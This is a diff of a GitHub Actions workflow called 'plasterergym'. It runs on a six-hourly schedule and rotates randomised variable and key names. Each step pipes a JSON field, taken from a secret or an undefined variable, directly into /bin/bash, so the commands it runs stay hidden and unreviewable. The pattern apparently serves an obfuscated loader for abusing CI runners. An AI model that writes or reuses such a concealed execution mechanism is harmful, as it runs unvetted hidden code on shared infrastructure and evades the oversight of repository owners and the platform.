@@ -1,26 +1,27 @@
 name: plasterergym
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '29 5/6 * * *'
-
-jobs:  # 7664
+    - cron: '55 0/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: plasterergym
         env:
-          egyp30: ${{ secrets.egyp30 }}
+          pibrl4092: ${{ secrets.pibrl4092 }}
         run: |
-          echo $egyp30 | jq -r .xl22597 | /bin/bash
-          echo $x6 | jq -r .s36 | /bin/bash
-          echo $kcv90 | jq -r .j8478 | /bin/bash
-          echo $goazi4 | jq -r .oepp51693 | /bin/bash
-          echo $ssx12 | jq -r .htzc19037 | /bin/bash
-          echo $clu134 | jq -r .huc98759 | /bin/bash
-          echo $w022 | jq -r .tyej69095 | /bin/bash
-          echo $dyr68579 | jq -r .l9 | /bin/bash
-          echo $ubkz000 | jq -r .oy34928 | /bin/bash
+          echo $pibrl4092 | jq -r .w20796 | /bin/bash
+          echo $pig7 | jq -r .kbn8 | /bin/bash
+          echo $ilqvh65 | jq -r .euwr16 | /bin/bash
+          echo $mh757 | jq -r .hityf38 | /bin/bash
+          echo $yq79 | jq -r .wayw4261 | /bin/bash
+          echo $he3570 | jq -r .e3542 | /bin/bash
+          echo $qovnv5855 | jq -r .tcu9188 | /bin/bash
+          echo $zkbdi333 | jq -r .yq031 | /bin/bash
+          echo $jzcy1 | jq -r .lm88100 | /bin/bash
+          echo $dpm399 | jq -r .grshf374 | /bin/bash
+          echo $qs362 | jq -r .xiyqq49 | /bin/bash
 
